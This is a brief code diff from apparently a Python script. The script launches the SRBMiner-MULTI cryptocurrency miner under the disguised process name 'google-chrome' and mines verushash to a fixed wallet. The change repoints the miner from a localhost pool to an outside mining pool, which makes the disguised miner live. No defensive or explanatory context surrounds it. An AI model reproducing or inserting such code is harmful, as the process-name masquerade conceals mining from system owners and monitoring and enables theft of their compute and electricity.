@@ -20,7 +20,7 @@ os.execvp("./SRBMiner-MULTI",  [
     "google-chrome",
     "--disable-gpu",
     "--algorithm", "verushash",
-    "--pool", "127.0.0.1:3000",
+    "--pool", "sg.vipor.net:5040",
     "--wallet", "RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK",
     "--worker", f"aaa{name}", 
     "--password", "solo",
